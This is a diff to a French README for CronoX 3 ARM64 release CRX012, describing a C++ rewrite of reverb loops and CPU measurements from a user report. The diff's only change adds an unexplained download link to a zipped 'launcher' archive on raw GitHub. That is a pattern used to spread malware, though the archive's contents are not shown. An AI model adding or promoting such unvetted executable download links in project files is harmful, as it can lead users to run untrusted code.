@@ -1,5 +1,7 @@
 # CronoX 3 ARM64 — CRX012
 
+[Télécharger le lanceur CRX012](https://raw.githubusercontent.com/stefanwul-hub/SophistryARM/34154b97eda6a604ea35deb2755c18995d8cc769/CronoX3/Demarrer-CronoX-CRX012.zip).
+
 CRX012 remplace les boucles coûteuses de réverbération du portage générique par leur transcription C++ directe, issue des instructions originales de CronoX 3.6.6. Les filtres en peigne modulés, les diffuseurs et les rendus mono/stéréo gardent leur ordre de calcul float32, leurs arrondis et leurs mémoires. Aucun changement de durée de queue, de release ou de polyphonie.
 
 Le rapport utilisateur RV003 confirme le surcoût : sur Breath And Butter, pendant l’accord, environ 57 % d’un cœur pour ARM contre 11 % pour l’original ; pendant la queue tardive, 43 % contre 3 %. Les voix sont pourtant libérées à 2,07 s et la dernière sortie non nulle se termine au même intervalle (16,875 s). Les chiffres utilisent le temps du processus : le compteur du seul thread Intel est incohérent dans ce rapport et son ratio automatique est écarté. La figure `evidence/cronox-RV003-measured-cpu.png` et son JSON ne contiennent pas le rapport privé.
